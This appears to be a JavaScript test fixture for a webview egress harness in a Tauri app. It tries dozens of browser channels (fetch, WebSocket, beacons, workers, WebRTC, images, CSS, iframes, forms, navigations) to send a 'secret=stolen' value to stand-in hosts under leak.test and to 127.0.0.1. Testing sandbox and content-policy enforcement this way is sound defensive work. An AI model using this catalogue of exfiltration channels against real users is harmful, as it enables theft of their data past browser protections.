// Hostile script for tests/egress: tries every way it knows to send data out of the window.
//
// Each attempt targets a distinct host name (v-<attempt>.leak.test) so that the harness's fake
// DNS server and listeners can tell exactly which attempt got out. Some also use a bare IP
// address, to cover the case where no name lookup is needed.
(async () => {
  const PORT = __PORT__;
  const results = {};
  const violations = [];
  document.addEventListener('securitypolicyviolation', (e) => violations.push(`${e.effectiveDirective} ${e.blockedURI}`));

  const host = (name) => `v-${name}.leak.test`;
  const url = (name, scheme = 'http', port = PORT) => `${scheme}://${host(name)}:${port}/${name}?secret=stolen`;
  const ipUrl = (name) => `http://127.0.0.1:${PORT}/ip-${name}?secret=stolen`;
  const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
  const add = (tag, attrs, parent = document.body) => {
    const e = document.createElement(tag);
    for (const [k, v] of Object.entries(attrs)) e.setAttribute(k, v);
    parent.appendChild(e);
    return e;
  };
  const loaded = (e) => new Promise((r) => { e.onload = () => r('load event'); e.onerror = () => r('error event'); });

  async function attempt(name, fn) {
    try {
      const outcome = await Promise.race([Promise.resolve().then(fn), sleep(3000).then(() => 'no answer within 3 s')]);
      results[name] = `completed: ${String(outcome).slice(0, 160)}`;
    } catch (e) {
      results[name] = `refused: ${e && e.name}: ${String(e && e.message).slice(0, 160)}`;
    }
  }

  // Requests made directly by script.
  await attempt('fetch', () => fetch(url('fetch')).then((r) => r.status));
  await attempt('fetch-ip', () => fetch(ipUrl('fetch')).then((r) => r.status));
  await attempt('fetch-no-cors', () => fetch(url('fetch-no-cors'), { mode: 'no-cors' }).then((r) => r.type));
  await attempt('fetch-post', () => fetch(url('fetch-post'), { method: 'POST', body: 'secret=stolen' }).then((r) => r.status));
  await attempt('fetch-https', () => fetch(url('fetch-https', 'https', PORT + 1)).then((r) => r.status));
  await attempt('xhr', () => new Promise((res, rej) => {
    const x = new XMLHttpRequest();
    x.open('GET', url('xhr'));
    x.onload = () => res(x.status);
    x.onerror = () => rej(new Error('network error'));
    x.send();
  }));
  await attempt('websocket', () => new Promise((res) => {
    const ws = new WebSocket(url('websocket', 'ws'));
    ws.onopen = () => res('open');
    ws.onerror = () => res('error event');
  }));
  await attempt('eventsource', () => new Promise((res) => {
    const es = new EventSource(url('eventsource'));
    es.onopen = () => res('open');
    es.onerror = () => { es.close(); res('error event'); };
  }));
  await attempt('beacon', () => navigator.sendBeacon(url('beacon'), 'secret=stolen'));
  await attempt('dynamic-import', () => import(url('dynamic-import')));
  await attempt('worker', () => new Worker(url('worker')));
  await attempt('worker-blob', () => new Worker(URL.createObjectURL(new Blob([`fetch('${url('worker-blob')}')`]))));
  await attempt('service-worker', () => navigator.serviceWorker ? navigator.serviceWorker.register(url('service-worker')) : 'not available');
  await attempt('fontface', () => new FontFace('leak', `url(${url('fontface')})`).load());
  await attempt('webrtc', async () => {
    if (!window.RTCPeerConnection) return 'not available';
    const pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:127.0.0.1:3478' }, { urls: `stun:${host('webrtc')}:3478` }] });
    pc.createDataChannel('leak');
    await pc.setLocalDescription(await pc.createOffer());
    await sleep(2500);
    return pc.iceGatheringState;
  });

  // Requests made by elements.
  await attempt('image', () => { const i = new Image(); const p = loaded(i); i.src = url('image'); return p; });
  await attempt('image-ip', () => { const i = new Image(); const p = loaded(i); i.src = ipUrl('image'); return p; });
  await attempt('css-property', () => { document.body.style.backgroundImage = `url(${url('css-property')})`; return 'set'; });
  await attempt('style-element', () => { const s = document.createElement('style'); s.textContent = `body{background:url(${url('style-element')})}`; document.head.appendChild(s); return 'added'; });
  await attempt('stylesheet', () => loaded(add('link', { rel: 'stylesheet', href: url('stylesheet') }, document.head)));
  for (const rel of ['prefetch', 'preload', 'dns-prefetch', 'preconnect', 'modulepreload', 'icon']) {
    await attempt(`link-${rel}`, () => { add('link', { rel, href: url(`link-${rel}`), as: 'fetch' }, document.head); return 'added'; });
  }
  await attempt('anchor-present', () => { add('a', { href: url('anchor-present') }).textContent = 'x'; return 'added'; });
  await attempt('script', () => loaded(add('script', { src: url('script') })));
  await attempt('iframe', () => loaded(add('iframe', { src: url('iframe') })));
  await attempt('iframe-srcdoc', () => loaded(add('iframe', { srcdoc: `<img src="${url('iframe-srcdoc')}">` })));
  await attempt('object', () => { add('object', { data: url('object') }); return 'added'; });
  await attempt('embed', () => { add('embed', { src: url('embed') }); return 'added'; });
  await attempt('audio', () => loaded(add('audio', { src: url('audio'), preload: 'auto' })));
  await attempt('video', () => loaded(add('video', { src: url('video'), preload: 'auto', poster: url('video-poster') })));
  await attempt('svg-image', () => {
    const svg = document.createElementNS('http://www.w3.org/2000/svg', 'svg');
    const image = document.createElementNS('http://www.w3.org/2000/svg', 'image');
    image.setAttribute('href', url('svg-image'));
    svg.appendChild(image);
    document.body.appendChild(svg);
    return 'added';
  });
  await attempt('base-then-relative', () => { add('base', { href: url('base') }, document.head); return fetch('relative-after-base').then((r) => r.status); });

  await sleep(3000); // let element loads settle
  await attempt('report', () => window.__TAURI__.core.invoke('probe_report', {
    report: { results, violations, userAgent: navigator.userAgent, webrtcAvailable: Boolean(window.RTCPeerConnection) },
  }));

  // Navigations last: if one escaped, nothing after it would run.
  window.open(url('window-open'));
  await sleep(500);
  const anchor = add('a', { href: url('anchor-click'), target: '_blank', ping: url('anchor-ping') });
  anchor.click();
  await sleep(500);
  add('meta', { 'http-equiv': 'refresh', content: `0;url=${url('meta-refresh')}` }, document.head);
  await sleep(1000);
  const form = add('form', { action: url('form'), method: 'GET' });
  add('input', { name: 'secret', value: 'stolen' }, form);
  form.submit();
  await sleep(1000);
  location.href = url('location');
  await sleep(1000);
  location.href = ipUrl('location');
})();
